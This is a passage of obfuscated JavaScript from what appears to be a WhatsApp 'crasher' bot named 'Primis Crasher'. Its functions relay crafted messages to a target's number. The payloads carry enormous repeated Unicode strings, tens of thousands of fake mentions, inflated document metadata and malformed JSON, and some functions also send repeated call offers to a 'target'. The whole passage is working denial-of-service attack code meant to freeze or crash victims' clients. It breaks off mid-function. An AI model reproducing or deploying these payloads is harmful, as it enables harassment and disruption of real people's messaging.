᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴'.repeat(0x32)
              },
              'nativeFlowMessage': {
                'messageParamsJson': '{}'
              },
              'contextInfo': {
                'mentionedJid': ["628888888888@s.whatsapp.net", ...Array.from({
                  'length': 0x2710
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    'fileLength': '9999999999999',
                    'pageCount': 0x4e729fff,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "\0",
                    'fileEncSha256': 'wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=',
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': 'gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=',
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x39c20e
        }
      });
    }
    ;
    async function _0x21ee34(_0x56b084, _0x3a5a4d = false) {
      await _0x35a9de.relayMessage(_0x56b084, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'locationMessage': {
                  'degreesLatitude': 0x0,
                  'degreesLongitude': 0x0
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "⏤͟͟͞͞Primis⿻" + 'ꦾ'.repeat(0x493e0)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': '1@newsletter',
                  'groupSubject': " Primis "
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x56b084
        }
      }, {
        'messageId': null
      });
    }
    async function _0x4ba357(_0x48f6f0, _0x9c23f3 = false) {
      await _0x35a9de.relayMessage(_0x48f6f0, {
        'extendedTextMessage': {
          'text': '⏤͟͟͞͞Primis⿻' + "".repeat(0x15f90),
          'contextInfo': {
            'stanzaId': "1234567890ABCDEF",
            'participant': "0@s.whatsapp.net",
            'quotedMessage': {
              'callLogMesssage': {
                'isVideo': true,
                'callOutcome': '1',
                'durationSecs': '0',
                'callType': "REGULAR",
                'participants': [{
                  'jid': "0@s.whatsapp.net",
                  'callOutcome': '1'
                }]
              }
            },
            'remoteJid': _0x48f6f0,
            'conversionSource': 'source_example',
            'conversionData': "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
            'conversionDelaySeconds': 0xa,
            'forwardingScore': 0x5f5e0ff,
            'isForwarded': true,
            'quotedAd': {
              'advertiserName': "Example Advertiser",
              'mediaType': "IMAGE",
              'jpegThumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              'caption': "This is an ad caption"
            },
            'placeholderKey': {
              'remoteJid': "0@s.whatsapp.net",
              'fromMe': false,
              'id': 'ABCDEF1234567890'
            },
            'expiration': 0x15180,
            'ephemeralSettingTimestamp': '1728090592378',
            'ephemeralSharedSecret': 'ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==',
            'externalAdReply': {
              'title': 'Primis',
              'body': ",You don't have a problem, do you? ??" + "".repeat(0xc8),
              'mediaType': "VIDEO",
              'renderLargerThumbnail': true,
              'previewTtpe': "VIDEO",
              'thumbnail': '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=',
              'sourceType': " x ",
              'sourceId': " x ",
              'sourceUrl': "https://prim_apex_zephyr",
              'mediaUrl': 'https://prim_apex_zephyr',
              'containsAutoReply': true,
              'renderLargerThumbnail': true,
              'showAdAttribution': true,
              'ctwaClid': 'ctwa_clid_example',
              'ref': "ref_example"
            },
            'entryPointConversionSource': "entry_point_source_example",
            'entryPointConversionApp': "entry_point_app_example",
            'entryPointConversionDelaySeconds': 0x5,
            'disappearingMode': {},
            'actionLink': {
              'url': "https://prim_apex_zephyr"
            },
            'groupSubject': "Example Group Subject",
            'parentGroupJid': "6287888888888-1234567890@g.us",
            'trustBannerType': "trust_banner_example",
            'trustBannerAction': 0x1,
            'isSampled': false,
            'utm': {
              'utmSource': 'utm_source_example',
              'utmCampaign': 'utm_campaign_example'
            },
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': "6287888888888-1234567890@g.us",
              'serverMessageId': 0x1,
              'newsletterName': " target ",
              'contentType': "UPDATE",
              'accessibilityText': " target "
            },
            'businessMessageForwardInfo': {
              'businessOwnerJid': "0@s.whatsapp.net"
            },
            'smbcayCampaignId': 'smb_cay_campaign_id_example',
            'smbServerCampaignId': 'smb_server_campaign_id_example',
            'dataSharingContext': {
              'showMmDisclosure': true
            }
          }
        }
      }, _0x9c23f3 ? {
        'participant': {
          'jid': _0x48f6f0
        }
      } : {});
    }
    async function _0x4331d9(_0x118005) {
      try {
        await _0x35a9de.offerCall(_0x118005);
        console.log(chalk.white.bold("Success Send an offer Call to target"));
      } catch (_0x1e29f4) {
        console.error(chalk.white.bold("Failed to send RFP to target:", _0x1e29f4));
      }
    }
    async function _0x46e130(_0x4f6608) {
      try {
        await _0x35a9de.offerCall(_0x4f6608, {
          'video': true
        });
        console.log(chalk.white.bold("Success Send an offer Video call to target"));
      } catch (_0x262a82) {
        console.error(chalk.white.bold("Failed to send offer video call to target:", _0x262a82));
      }
    }
    async function _0x1703c2(_0x2be87b) {
      let _0x231121 = JSON.stringify({
        'status': true,
        'criador': 'TheXtordcv',
        'resultado': {
          'type': 'md',
          'ws': {
            '_events': {
              'CB:ib,,dirty': ["Array"]
            },
            '_eventsCount': 0xc3500,
            '_maxListeners': 0x0,
            'url': "wss://web.whatsapp.com/ws/chat",
            'config': {
              'version': ["Array"],
              'browser': ["Array"],
              'waWebSocketUrl': "wss://web.whatsapp.com/ws/chat",
              'sockCectTimeoutMs': 0x4e20,
              'keepAliveIntervalMs': 0x7530,
              'logger': {},
              'printQRInTerminal': false,
              'emitOwnEvents': true,
              'defaultQueryTimeoutMs': 0xea60,
              'customUploadHosts': [],
              'retryRequestDelayMs': 0xfa,
              'maxMsgRetryCount': 0x5,
              'fireInitQueries': true,
              'auth': {
                'Object': "authData"
              },
              'markOnlineOnsockCect': true,
              'syncFullHistory': true,
              'linkPreviewImageThumbnailWidth': 0xc0,
              'transactionOpts': {
                'Object': "transactionOptsData"
              },
              'generateHighQualityLinkPreview': false,
              'options': {},
              'appStateMacVerification': {
                'Object': "appStateMacData"
              },
              'mobile': true
            }
          }
        }
      });
      let _0x1381e7 = await generateWAMessageFromContent(_0x2be87b, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'hasMediaAttachment': false
              },
              'body': {
                'text': "I Love You"
              },
              'nativeFlowMessage': {
                'messageParamsJson': '{'.repeat(0x2710),
                'buttons': [{
                  'name': "single_select",
                  'buttonParamsJson': _0x231121
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': _0x231121 + '{'
                }]
              }
            }
          }
        }
      }, {});
      await _0x35a9de.relayMessage(_0x2be87b, _0x1381e7.message, {
        'messageId': _0x1381e7.key.id,
        'participant': {
          'jid': _0x2be87b
        }
      });
    }
    async function _0x442a27(_0x45d134, _0x3b9c3d = true) {
      await _0x35a9de.relayMessage(_0x45d134, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  'fileLength': '9999999999999999',
                  'pageCount': 0x9184e729fff,
                  'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  'fileName': "I Love You",
                  'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  'directPath': "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1715880173",
                  'contactVcard': true
                },
                'title': "I Love You",
                'hasMediaAttachment': true
              },
              'body': {
                'text': 'ꦽ'.repeat(0xc350) + "_*~@8~*_\n".repeat(0xc350) + '@8'.repeat(0xc350)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': '0@s.whatsapp.net',
                  'groupSubject': "anjay"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x45d134
        }
      }, {
        'messageId': null
      });
    }
    async function _0x1dd33e(_0x1840c6) {
      const _0x36ee6d = "_*~@15056669999~*_\n".repeat(0x27d8);
      const _0x20c9c1 = 'ꦽ'.repeat(0x5dc);
      const _0xcf0557 = {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': 'https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true',
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
                  'fileLength': "9999999999999",
                  'pageCount': 0x4e729fff,
                  'mediaKey': "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  'fileName': "Emak Lu Musuh Gua",
                  'fileEncSha256': 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
                  'directPath': "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1726867151",
                  'contactVcard': true,
                  'jpegThumbnail': ''
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "I Love You" + _0x20c9c1 + _0x36ee6d
              },
              'contextInfo': {
                'mentionedJid': ["15056669999@s.whatsapp.net", ...Array.from({
                  'length': 0x2710
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': 'status@broadcast',
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                    'fileSha256': 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
                    'fileLength': '9999999999999',
                    'pageCount': 0x4e729fff,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "https://xnxxx.com",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': '1724474503',
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      };
      await _0x35a9de.relayMessage(_0x1840c6, _0xcf0557, {
        'participant': {
          'jid': _0x1840c6
        }
      });
    }
    async function _0x3a0067(_0x2c4020, _0x141058 = true) {
      try {
        const _0x1e4fc3 = {
          'botInvokeMessage': {
            'message': {
              'newsletterAdminInviteMessage': {
                'newsletterJid': "33333333333333333@newsletter",
                'newsletterName': "Primis BlankGroup 🥵" + 'ꦾ'.repeat(0x186a0),
                'jpegThumbnail': '',
                'caption': 'ꦽ'.repeat(0x186a0) + '@0'.repeat(0x186a0),
                'inviteExpiration': Date.now() + 0x6c258c00
              }
            }
          },
          'nativeFlowMessage': {
            'messageParamsJson': '',
            'buttons': [{
              'name': "call_permission_request",
              'buttonParamsJson': '{}'
            }, {
              'name': "galaxy_message",
              'paramsJson': {
                'screen_2_OptIn_0': true,
                'screen_2_OptIn_1': true,
                'screen_1_Dropdown_0': "nullOnTop",
                'screen_1_DatePicker_1': "1028995200000",
                'screen_1_TextInput_2': 'null@gmail.com',
                'screen_1_TextInput_3': "94643116",
                'screen_0_TextInput_0': "\0".repeat(0x7a120),
                'screen_0_TextInput_1': 'SecretDocu',
                'screen_0_Dropdown_2': '#926-Xnull',
                'screen_0_RadioButtonsGroup_3': "0_true",
                'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }
            }]
          },
          'contextInfo': {
            'mentionedJid': Array.from({
              'length': 0x5
            }, () => "0@s.whatsapp.net"),
            'groupMentions': [{
              'groupJid': "0@s.whatsapp.net",
              'groupSubject': '𝐈𝐬𝐚𝐠𝐢𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬'
            }]
          }
        };
        await _0x35a9de.relayMessage(_0x2c4020, _0x1e4fc3, {
          'userJid': _0x2c4020
        });
      } catch (_0x1a52a7) {
        console.error("Error sending newsletter:", _0x1a52a7);
      }
    }
    const _0x1fbef7 = async _0x38fa27 => {
      await _0x598ae1(0x1f4);
      return _0x35a9de.sendMessage(_0x51e776.chat, {
        'text': _0x38fa27,
        'contextInfo': {
          'mentionedJid': [_0x51e776.sender],
          'externalAdReply': {
            'showAdAttribution': false,
            'renderLargerThumbnail': false,
            'title': "𝐏𝐫𝐢𝐦𝐢𝐬 𝐂𝐫𝐚𝐬𝐡𝐞𝐫",
            'body': "𝐏𝐫𝐢𝐦𝐢𝐬 𝐂𝐫𝐚𝐬𝐡𝐞𝐫",
            'previewType': "VIDEO",
            'thumbnailUrl': "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg",
            'sourceUrl': "https://whatsapp.com/channel/0029VbAqjwm1CYoTLEg7KR44",
            'mediaUrl': "https://whatsapp.com/channel/0029VbB2Xry0LKZAuosqRO0k"
          },
          'isForwarded': false,
          'forwardingScore': 0x1869f
        }
      }, {
        'quoted': _0x51e776
      });
      await _0x598ae1(0x1f4);
    };
    async function _0xf070bc(_0x31ec84) {
      const _0x492251 = {
        'newsletterAdminInviteMessage': {
          'newsletterJid': "120363321780343299@newsletter",
          'newsletterName': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻" + 'ោ៝'.repeat(0x2710),
          'caption': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻" + 'ោ៝'.repeat(0x2710),
          'inviteExpiration': "999999999"
        }
      };
      await _0x35a9de.relayMessage(_0x31ec84, _0x492251, {
        'participant': {
          'jid': _0x31ec84
        },
        'messageId': null
      });
    }
    async function _0x27dd6b(_0x35f217, _0x389eff) {
      const _0x3934e6 = {
        'viewOnceMessage': {
          'message': {
            'imageMessage': {
              'url': "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
              'mimetype': "image/jpeg",
              'caption': "𝐃𝐒 𝐏𝐑𝐈𝐌𝐈𝐒-‣🚀 ",
              'fileSha256': "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
              'fileLength': '19769',
              'height': 0x162,
              'width': 0x30f,
              'mediaKey': "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
              'fileEncSha256': "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
              'directPath': "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              'mediaKeyTimestamp': '1743225419',
              'jpegThumbnail': null,
              'scansSidecar': "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
              'scanLengths': [0x985, 0x43b4],
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x7530
                }, () => '1' + Math.floor(Math.random() * 0x895440) + '@s.whatsapp.net'),
                'isSampled': true,
                'participant': _0x35f217,
                'remoteJid': "status@broadcast",
                'forwardingScore': 0x260d,
                'isForwarded': true
              }
            }
          }
        }
      };
      const _0x53de2b = generateWAMessageFromContent(_0x35f217, _0x3934e6, {});
      if (!_0x53de2b.key || !_0x53de2b.key.id) {
        _0x53de2b.key = {
          'remoteJid': _0x35f217,
          'fromMe': true,
          'id': (Math.random() * 0x2386f26fc10000).toString(0x24)
        };
      }
      await _0x35a9de.relayMessage("status@broadcast", _0x53de2b.message, {
        'messageId': _0x53de2b.key.id,
        'statusJidList': [_0x35f217],
        'additionalNodes': [{
          'tag': 'meta',
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x35f217
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x389eff) {
        await _0x35a9de.relayMessage(_0x35f217, {
          'statusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x53de2b.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': 'meta',
            'attrs': {
              'is_status_mention': "INVISIBLE -𝟗𝟕𝟒𝟏"
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x219a7f(_0xa79aa1, _0x2b9545) {
      let _0x368ccc = await generateWAMessageFromContent(_0xa79aa1, {
        'buttonsMessage': {
          'text': '🩸',
          'contentText': "𑲭𑲭𝐇𝐈 𝐈'𝐀𝐌 𝐏𝐑𝐈𝐌𝐈𝐒⍣𐎟𑆻",
